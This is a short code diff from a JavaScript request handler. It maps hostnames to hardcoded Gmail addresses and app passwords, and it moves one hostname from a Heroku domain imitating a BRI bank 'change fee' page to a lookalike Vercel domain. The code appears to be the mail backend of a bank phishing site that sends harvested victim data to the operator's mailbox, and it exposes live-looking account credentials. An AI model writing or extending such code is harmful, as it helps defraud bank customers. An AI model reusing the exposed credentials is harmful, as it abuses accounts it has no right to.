@@ -13,7 +13,7 @@ export default function handler(req, res) {
        pass = 'zxcqkwszxhzvrsec'
     }else
     
-    if (url == 'ubah-tarifku-bri.herokuapp.com'){
+    if (url == 'ubah--tarifkuu.vercel.app'){
 
        email = 'ff12.ff12.12345@gmail.com'
        pass = 'ltnuppdgvikqudiv'
